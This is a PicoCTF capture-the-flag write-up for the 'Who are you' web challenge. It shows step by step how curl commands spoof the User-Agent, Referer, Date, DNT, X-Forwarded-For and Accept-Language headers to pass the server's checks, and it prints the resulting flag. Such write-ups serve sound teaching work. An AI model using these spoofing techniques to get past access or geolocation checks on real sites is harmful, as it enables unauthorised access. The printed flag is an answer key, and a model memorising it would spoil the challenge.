---
title: Who are you
categories: [writeups,PicoCTF]
tags: [web]
---

## Description
```
Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn 
http://mercury.picoctf.net:36622/
```
## Solution
- First look into the website.
- In this challenge, i will only use `curl` command but it is possible to use other tools or even web browser.

```bash
>> curl http://mercury.picoctf.net:36622                    
#html code
		<h3 style="color:red">Only people who use the official PicoBrowser are allowed on this site!</h3>
#html code
```

- According to the result, the website required us to use `PicoBrowser` but there is no such thing as `PicoBrowser`.
- Instead we could make use of `user agent` http header to change our browser to `PicoBrowser`.

```bash
>> curl --user-agent "PicoBrowser" mercury.picoctf.net:36622
#html code
		<h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>
#html code
```

- Next, the website only allow user to visit from their own site.
- This means that we should refer from the same site instead by modifying http header.

```bash
>> curl --user-agent "PicoBrowser" --referer "http://mercury.picoctf.net:36622/"  http://mercury.picoctf.net:36622/
#html code
        <h3 style="color:red">Sorry, this site only worked in 2018.</h3>
#html code
```

- Next, the website only work in 2018.
- We could allow it to work by setting our own date header.

```bash
>> curl --user-agent "PicoBrowser" --referer "http://mercury.picoctf.net:36622/" -H "Date: 2018" http://mercury.picoctf.net:36622/
# html code
		<h3 style="color:red">I don&#39;t trust users who can be tracked.</h3>
#html code
```

- Next, the website do not allow tracking.
- This can be done by disabling tracking by adding do not track header.

```bash
>> curl --user-agent "PicoBrowser" --referer "http://mercury.picoctf.net:36622/"  -H "Date: 2018"  -H "DNT:1" http://mercury.picoctf.net:36622/ 
#html code
		<h3 style="color:red">This website is only for people from Sweden.</h3>
#html code
```

- Next, the website only allow Sweden country.
- We could change the country to Sweden by providing a Sweden IP address in the header.
- `X-Forwarded-For` header will be used.

```bash
>> curl --user-agent "PicoBrowser" --referer "http://mercury.picoctf.net:36622/"  -H "Date: 2018"  -H "DNT:1" -H "X-Forwarded-For: 31.3.152.55" http://mercury.picoctf.net:36622/  
#html code
	    <h3 style="color:red">You&#39;re in Sweden but you don&#39;t speak Swedish?</h3>
#html code
```

- This website is not asking for swedish language.
- We could just change the language header.

```bash
>> curl --user-agent "PicoBrowser" --referer "http://mercury.picoctf.net:36622/"  -H "Date: 2018"  -H "DNT:1" -H "X-Forwarded-For: 31.3.152.55" -H "Accept-Language: sv-SE " http://mercury.picoctf.net:36622/
#html code
		<h3 style="color:green">What can I say except, you are welcome</h3>
#html code
		<b>picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_0da16bb2}</b>
#html code
```

- This is how we got our flag.